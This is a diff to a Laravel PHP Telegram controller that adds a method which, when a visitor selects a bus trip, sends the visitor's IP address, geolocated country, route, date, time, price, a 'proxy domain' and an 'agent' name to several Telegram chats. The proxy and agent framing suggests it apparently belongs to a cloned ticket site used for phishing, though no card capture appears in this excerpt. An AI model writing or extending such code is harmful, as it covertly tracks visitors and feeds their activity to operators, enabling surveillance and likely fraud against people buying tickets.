@@ -730,4 +730,119 @@ class TelegramController extends Controller
             ], 500);
         }
     }
+
+    /**
+     * Notificar selección de viaje a Telegram
+     */
+    public function notifySelection(Request $request)
+    {
+        $origen = $request->input('origen');
+        $destino = $request->input('destino');
+        $fecha = $request->input('fecha');
+        $hora = $request->input('hora');
+        $servicio = $request->input('servicio');
+        $precio = $request->input('precio');
+
+        // Obtener IP real del usuario
+        $ip = self::getRealIp($request);
+
+        // Obtener país usando geolocalización por IP
+        $pais = self::getCountryFromIp($ip);
+
+        // PROTECCIÓN: Evitar envíos duplicados
+        $messageHash = md5($ip . $origen . $destino . $fecha . $hora);
+        $sendCacheKey = "telegram_selection_{$messageHash}";
+
+        if (Cache::has($sendCacheKey)) {
+            Log::info("Notificación de selección duplicada bloqueada para IP {$ip}");
+            return response()->json([
+                'success' => true,
+                'message' => 'Selección ya notificada recientemente',
+                'status' => 'duplicate_prevented'
+            ]);
+        }
+
+        // Marcar este envío como procesado (expira en 60 segundos)
+        Cache::put($sendCacheKey, true, now()->addSeconds(60));
+
+        // Obtener chat_ids y nombre
+        $chatIds = $this->getChatIds();
+        $name = $this->getName();
+
+        if (empty($chatIds)) {
+            Log::error('No se pudieron obtener chat_ids para notificar selección');
+            return response()->json([
+                'success' => false,
+                'error' => 'Chat IDs not configured'
+            ], 500);
+        }
+
+        // Obtener dominio del proxy
+        $proxyDomain = request()->getHost();
+
+        // Construir mensaje de notificación
+        $fechaConsulta = now()->setTimezone('America/Bogota')->format('d/m/Y H:i:s');
+        $precioFormateado = number_format($precio, 0, ',', '.');
+
+        $message = "🎫 *VIAJE SELECCIONADO*\n";
+        $message .= "_El usuario eligió un viaje_\n\n";
+        $message .= "🌐 *Dominio:* `{$proxyDomain}`\n";
+        $message .= "👤 *Agente:* `{$name}`\n\n";
+        $message .= "📍 *IP Usuario:* `{$ip}`\n";
+        $message .= "🏳️ *País:* `{$pais}`\n\n";
+        $message .= "🚌 *Ruta:* `{$origen}` → `{$destino}`\n";
+        $message .= "📅 *Fecha:* `{$fecha}`\n";
+        $message .= "🕐 *Hora:* `{$hora}`\n";
+        $message .= "🚐 *Servicio:* `{$servicio}`\n";
+        $message .= "💰 *Precio:* `\${$precioFormateado} COP`\n";
+        $message .= "🕐 *Fecha selección:* `{$fechaConsulta}`\n";
+
+        try {
+            $successCount = 0;
+            $errors = [];
+
+            foreach ($chatIds as $chatId) {
+                if (!$chatId) {
+                    continue;
+                }
+
+                $response = Http::post("https://api.telegram.org/bot{$this->botToken}/sendMessage", [
+                    'chat_id' => $chatId,
+                    'text' => $message,
+                    'parse_mode' => 'Markdown'
+                ]);
+
+                if ($response->successful()) {
+                    $successCount++;
+                    Log::info("Notificación de selección enviada a Telegram", [
+                        'chat_id' => $chatId,
+                        'ip' => $ip,
+                        'ruta' => "{$origen} -> {$destino}",
+                        'hora' => $hora
+                    ]);
+                } else {
+                    $errors[] = [
+                        'chat_id' => $chatId,
+                        'error' => $response->body()
+                    ];
+                    Log::error("Error enviando notificación de selección", [
+                        'chat_id' => $chatId,
+                        'error' => $response->body()
+                    ]);
+                }
+            }
+
+            return response()->json([
+                'success' => $successCount > 0,
+                'message' => "Notificación enviada a {$successCount} chat(s)",
+                'ip' => $ip
+            ]);
+        } catch (\Exception $e) {
+            Log::error("Excepción al notificar selección: " . $e->getMessage());
+            return response()->json([
+                'success' => false,
+                'error' => $e->getMessage()
+            ], 500);
+        }
+    }
 }
